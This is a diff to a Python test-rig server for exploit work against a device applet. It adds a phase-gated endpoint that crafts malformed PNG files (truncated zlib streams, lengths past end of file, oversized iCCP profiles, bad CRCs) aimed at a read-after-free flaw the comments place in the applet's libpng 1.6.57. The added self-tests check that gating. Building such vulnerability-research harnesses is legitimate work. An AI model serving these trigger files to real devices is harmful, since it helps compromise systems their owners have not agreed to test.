@@ -33,6 +33,11 @@ Routes (route by Host header, mirroring the verified public bench):
   /rig/phase      -> GET: the current exploit-phase gate (fontchain class
                      pages refuse to run beyond it); POST {"phase":N}
                      (local-only) advances it. Default 1 = trigger-only.
+  /rig/png/ztxt   -> GET: parameterized PNG crafter for the pngztxt oracle
+                     (mode=N&seed=N; stdlib zlib only). Benign compressed
+                     zTXt/iCCP/iTXt modes 0-3 are always served; malformed
+                     modes 10-16 (the CVE-2026-46675 shapes) need rig
+                     phase >= 2, mirroring the page's own gate.
   /ws             -> real WebSocket endpoint (RFC 6455, stdlib-only):
                      ?role=agent is the on-console eval-RPC agent
                      (wsagent.html); ?role=console is an operator bridge;
@@ -78,6 +83,7 @@ import subprocess
 import sys
 import threading
 import time
+import zlib
 from collections import deque
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -129,6 +135,86 @@ class RigHttpError(Exception):
     def __init__(self, status: int, code: str, message: str, allow: str | None = None):
         super().__init__(message)
         self.status, self.code, self.message, self.allow = status, code, message, allow
+
+
+# ---------------------------------------------------------------------------
+# PNG crafting (stdlib zlib only) — the pngztxt oracle's asset source
+# ---------------------------------------------------------------------------
+
+PNG_BENIGN_MODES = (0, 1, 2, 3)
+PNG_MALFORMED_MODES = (10, 11, 12, 13, 14, 15, 16)
+PNG_MODE_NAMES = {
+    0: "baseline-no-chunk", 1: "ztxt-ok", 2: "iccp-ok", 3: "itxt-ok",
+    10: "ztxt-truncated-zlib", 11: "ztxt-len-past-eof", 12: "iccp-huge-profile",
+    13: "iccp-truncated-zlib", 14: "ztxt-empty-compressed",
+    15: "itxt-truncated-zlib", 16: "ztxt-bad-crc",
+}
+
+
+def png_chunk(ctype: bytes, data: bytes, declared_len: int | None = None,
+              crc: int | None = None) -> bytes:
+    """One PNG chunk; declared_len/crc allow deliberately-broken framing."""
+    n = len(data) if declared_len is None else declared_len
+    c = (zlib.crc32(ctype + data) & 0xffffffff) if crc is None else crc
+    return struct.pack(">I", n) + ctype + data + struct.pack(">I", c)
+
+
+def craft_png(mode: int, seed: int = 0) -> bytes:
+    """An 8x8 RGBA PNG carrying a parameterized ancillary chunk.
+
+    Benign modes (phase 1, parse-success oracle): well-formed zTXt/iCCP/iTXt
+    with valid zlib payloads -- the compressed-ancillary-chunk code path in
+    the applet's libpng 1.6.57 executes without attacking it.
+    Malformed modes (phase 2, rig-gated): the shapes around the
+    CVE-2026-46675 read-after-free (truncated zlib streams, chunk framing
+    past EOF, oversized iCCP profiles, empty streams, bad CRC)."""
+    w = h = 8
+    sig = b"\x89PNG\r\n\x1a\n"
+    ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)   # 8-bit RGBA
+    scanlines = b""
+    for y in range(h):
+        scanlines += b"\x00"                               # filter: none
+        for x in range(w):
+            scanlines += bytes(((x * 31 + seed) & 0xff, (y * 17 + seed) & 0xff,
+                                ((x + y) * 7) & 0xff, 255))
+    idat = zlib.compress(scanlines, 9)
+    text = ("capsweep-seed-%d padding padding padding" % seed).encode()
+    profile = b"fake-profile " * 64 + text                 # small deterministic profile
+
+    if mode == 0:
+        anc = b""
+    elif mode == 1:                                        # zTXT: kw\0 method zlib(text)
+        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(text, 9))
+    elif mode == 2:                                        # iCCP: kw\0 method zlib(profile)
+        anc = png_chunk(b"iCCP", b"fake profile\x00\x00" + zlib.compress(profile, 9))
+    elif mode == 3:                                        # iTXt compressed: kw\0 1 0 lang\0 tkw\0 zlib
+        anc = png_chunk(b"iTXt",
+                        b"Note\x00\x01\x00en\x00note\x00" + zlib.compress(text, 9))
+    elif mode == 10:                                       # zTXt zlib stream cut mid-data
+        blob = zlib.compress(text * 8, 9)
+        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + blob[:len(blob) // 2])
+    elif mode == 11:                                       # declared length 64B past the data
+        data = b"Comment\x00\x00" + zlib.compress(text, 9)
+        anc = png_chunk(b"zTXt", data, declared_len=len(data) + 64)
+    elif mode == 12:                                       # iCCP with a ~1MiB profile
+        big = (profile * (1 + (1 << 20) // len(profile)))[:1 << 20]
+        anc = png_chunk(b"iCCP", b"big profile\x00\x00" + zlib.compress(big, 6))
+    elif mode == 13:                                       # iCCP zlib stream truncated
+        blob = zlib.compress(profile, 9)
+        anc = png_chunk(b"iCCP", b"fake profile\x00\x00" + blob[:len(blob) - 6])
+    elif mode == 14:                                       # zTXt zero-length compressed data
+        anc = png_chunk(b"zTXt", b"Comment\x00\x00")
+    elif mode == 15:                                       # iTXt compressed payload truncated
+        blob = zlib.compress(text, 9)
+        anc = png_chunk(b"iTXt",
+                        b"Note\x00\x01\x00en\x00note\x00" + blob[:len(blob) // 3])
+    elif mode == 16:                                       # zTXt with a wrong CRC
+        anc = png_chunk(b"zTXt", b"Comment\x00\x00" + zlib.compress(text, 9),
+                        crc=0xdeadbeef)
+    else:
+        raise ValueError("unknown png mode %d" % mode)
+    return sig + png_chunk(b"IHDR", ihdr) + png_chunk(b"IDAT", idat) + anc + \
+        png_chunk(b"IEND", b"")
 
 
 # ---------------------------------------------------------------------------
@@ -692,6 +778,8 @@ class PortalHandler(BaseHTTPRequestHandler):
             self._handle_swap(method, url)
         elif path == "/rig/phase":
             self._handle_phase(method)
+        elif path == "/rig/png/ztxt":
+            self._handle_png_craft(method, url)
         elif path == "/rig/ws/send":
             self._handle_ws_send(method)
         elif path == "/rig/ws/state":
@@ -781,6 +869,41 @@ class PortalHandler(BaseHTTPRequestHandler):
         new_phase = self.cfg.set_phase(body["phase"])
         LOG.info("%s POST /rig/phase -> phase=%d", peer, new_phase)
         self._send_json(200, {"ok": True, "phase": new_phase}, method)
+
+    def _handle_png_craft(self, method: str, url) -> None:
+        """Asset source for the pngztxt oracle page (LAN-reachable: the
+        console's <img> fetches it). mode=N selects a benign (0-3) or
+        malformed (10-16) compressed-ancillary-chunk shape; seed=N makes
+        the pixels/text deterministic. Malformed modes are refused unless
+        the rig phase gate is >= 2 -- the server-side mirror of the page's
+        own gate, so the shapes cannot be fetched by accident even with
+        the page open."""
+        if method not in ("GET", "HEAD"):
+            raise RigHttpError(405, "E_METHOD", "GET /rig/png/ztxt?mode=N&seed=N",
+                               allow="GET, HEAD")
+        params = {}
+        for pair in url.query.split("&"):
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                params[unquote(k)] = unquote(v)
+        try:
+            mode = int(params.get("mode", "0"))
+            seed = int(params.get("seed", "0"))
+        except ValueError:
+            raise RigHttpError(400, "E_BAD_MODE", "mode/seed must be integers")
+        if mode not in PNG_BENIGN_MODES and mode not in PNG_MALFORMED_MODES:
+            raise RigHttpError(404, "E_NO_SUCH_MODE",
+                               "mode %d unknown (benign: %s, malformed: %s)"
+                               % (mode, PNG_BENIGN_MODES, PNG_MALFORMED_MODES))
+        if mode in PNG_MALFORMED_MODES and self.cfg.get_phase() < 2:
+            raise RigHttpError(403, "E_PHASE_GATE",
+                               "malformed PNG modes need rig phase >= 2 "
+                               '(POST {"phase":2} at /rig/phase, local-only)')
+        body = craft_png(mode, seed)
+        LOG.info("%s GET /rig/png/ztxt mode=%d(%s) seed=%d -> %dB",
+                 self.client_address[0], mode, PNG_MODE_NAMES.get(mode, "?"),
+                 seed, len(body))
+        self._send(200, body, "image/png", method)
 
     def _handle_ws_upgrade(self, url) -> None:
         """RFC 6455 upgrade in the existing server (stdlib-only). role comes
@@ -1119,6 +1242,37 @@ def self_test() -> int:
         r, body = req(port, "POST", "/rig/phase", body=b'{"nope": 1}', ctype="application/json")
         check("/rig/phase bad body -> 400 E_BAD_PHASE",
               r.status == 400 and b"E_BAD_PHASE" in body, "status=%d" % r.status)
+
+        # (b5) /rig/png/ztxt crafter: benign modes served, signature valid,
+        # chunk framing right; malformed modes mirror the phase gate
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=1&seed=7")
+        ok_png = (r.status == 200 and body[:8] == b"\x89PNG\r\n\x1a\n"
+                  and b"zTXt" in body)
+        check("/rig/png/ztxt mode=1 -> 200 valid PNG with zTXt", ok_png,
+              "status=%d sig=%r" % (r.status, body[:8]))
+        for m in (0, 2, 3):
+            r, body = req(port, "GET", "/rig/png/ztxt?mode=%d" % m)
+            check("  benign mode %d -> 200 PNG" % m,
+                  r.status == 200 and body[:4] == b"\x89PNG")
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=10")
+        check("  malformed mode 10 gated at phase 1 -> 403 E_PHASE_GATE",
+              r.status == 403 and b"E_PHASE_GATE" in body, "status=%d" % r.status)
+        req(port, "POST", "/rig/phase", body=b'{"phase": 2}', ctype="application/json")
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=10&seed=3")
+        check("  malformed mode 10 at phase 2 -> 200 PNG",
+              r.status == 200 and body[:4] == b"\x89PNG" and b"zTXt" in body)
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=12")
+        check("  iccp-huge mode 12 -> 200 PNG with iCCP",
+              r.status == 200 and b"iCCP" in body)
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=99")
+        check("  unknown mode -> 404 E_NO_SUCH_MODE",
+              r.status == 404 and b"E_NO_SUCH_MODE" in body)
+        # framing invariants: IEND present, IHDR width/height sane
+        r, body = req(port, "GET", "/rig/png/ztxt?mode=1")
+        check("  crafted PNG has IHDR/IEND and 8x8 dims",
+              b"IHDR" in body and b"IEND" in body
+              and struct.unpack(">II", body[16:24]) == (8, 8))
+        req(port, "POST", "/rig/phase", body=b'{"phase": 1}', ctype="application/json")
 
         # (c) /report persists telemetry
         payload = json.dumps({"schema": 1, "phase": "selftest", "env": {"ua": "pytest"}}).encode()
